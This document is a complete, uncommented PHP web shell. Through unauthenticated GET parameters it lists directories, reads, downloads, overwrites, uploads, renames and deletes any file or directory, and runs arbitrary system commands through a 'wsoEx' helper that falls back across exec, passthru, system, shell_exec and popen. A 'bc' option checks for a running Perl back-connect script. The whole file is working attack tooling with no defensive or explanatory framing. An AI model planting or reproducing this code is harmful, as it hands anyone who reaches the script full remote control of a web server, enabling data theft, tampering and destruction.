<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
if(isset($_GET['action']))
if($_GET['action']=="Change"){
    if(isset($_GET['path']))
        if(is_dir($_GET['path']))
            $path = $_GET['path'];
        else
            die("is_file");
    else
        $path = getcwd()."/";
    $Files = array();
    $Dirs = array();
    $files = array_diff(scandir($path),array("."));
    $a = 0;
    foreach($files as $file)
        if(is_dir($path.$file))
            $Dirs[strval($a++)]=$file;

    foreach($files as $file)
        if(!is_dir($path.$file))
            $Files[strval($a++)]=$file;
        
    $inOrder = array_merge($Dirs,$Files);
    $inOrder[strval(sizeof($inOrder))] = getcwd()."/";
    $inOrder[strval(sizeof($inOrder))+1] = $path;
    echo json_encode($inOrder);
    }
else if($_GET["action"]=="Download")
{
    if(isset($_GET["path"]) && file_exists($_GET["path"]) && !is_dir($_GET["path"])){
            header("Content-Type: text/plain" );
            echo file_get_contents($_GET["path"]);
   }
    else{
        header("Content-length: 0");
    }
}
else if($_GET["action"]=="Edit"){
    if(isset($_GET["path"]) && is_file($_GET["path"]) && isset($_GET["contents"])){
        $fp = fopen($_GET["path"],"w");
        if(empty($_GET["contents"]))
            $contents = " ";
        else
            $contents = base64_decode($_GET["contents"]);
       if(fwrite($fp,$contents))
        echo "Success";
       else
        echo "";
        fclose($fp);
   }
   else
    echo "Failed";
    }
else if($_GET["action"]=="New"){
    if(isset($_GET["path"]))
        touch($_GET["path"]) or die("Failed");
        }
else if($_GET["action"]=="Delete"){
    if(isset($_GET["path"]) && is_file($_GET["path"])){
        if(unlink($_GET["path"]))
            echo "";
        else
            echo "Failed";
            }
    else if(isset($_GET["path"]) && is_dir($_GET["path"])){
        function rrmdir($dir){
	        		$objects = scandir($dir); 
		         	foreach ($objects as $object) 
		         	{ 
		           		if ($object != "." && $object != "..") 
		           		{ 
		             		if (is_dir($dir."/".$object))
		               			rrmdir($dir."/".$object);
		               		else
		               			unlink($dir."/".$object);
		           		}
		        	}
		        	if(rmdir($dir))
		        		return "";
		        	else
		        		return "Failed";
         		}
        echo rrmdir($_GET["path"]);
    }
    else
        echo "Failed";
        }
else if($_GET["action"]=="Upload"){
    if(isset($_GET["path"]) && isset($_GET["contents"])){
        $fp = fopen($_GET["path"],"w+");
        if(empty($_GET["contents"]))
            $contents = " ";
        else
            $contents = base64_decode($_GET["contents"]);
       if(fwrite($fp,$contents))
        echo "";
       else
        echo "Failed";
        fclose($fp);
   }
}
else if($_GET["action"]=="Rename"){
    if(isset($_GET["path"]) && isset($_GET["new"]) && isset($_GET["old"]) && file_exists($_GET["path"].$_GET["old"])){
        if(rename($_GET["path"].$_GET["old"],$_GET["path"].$_GET["new"]))
            echo "";
        else
            echo "Failed";
            }
    else 
        echo "Failed";
        }
else if($_GET["action"]=="Read"){
    if(isset($_GET["path"]) && is_file($_GET["path"])){
        echo base64_encode(file_get_contents($_GET["path"]));
        }
    else
        echo "";
}
else if($_GET["action"]=="CMD"){
   function wsoEx($in) {
	$out = '';
	if (function_exists('exec')) {
		@exec($in,$out);
		$out = @join("\n",$out);
	} elseif (function_exists('passthru')) {
		ob_start();
		@passthru($in);
		$out = ob_get_clean();
	} elseif (function_exists('system')) {
		ob_start();
		@system($in);
		$out = ob_get_clean();
	} elseif (function_exists('shell_exec')) {
		$out = shell_exec($in);
	} elseif (is_resource($f = @popen($in,"r"))) {
		$out = "";
		while(!@feof($f))
			$out .= fread($f,1024);
		pclose($f);
	}
	return $out;
    
}
if(isset($_GET["cmd"])){
        header("Content-Type: text/plain");
        if(isset($_GET["bc"]))
            echo wsoEx("ps aux | grep ".$_GET["bc"].".pl");
        else
            echo wsoEx($_GET["cmd"]);
}
}
?>
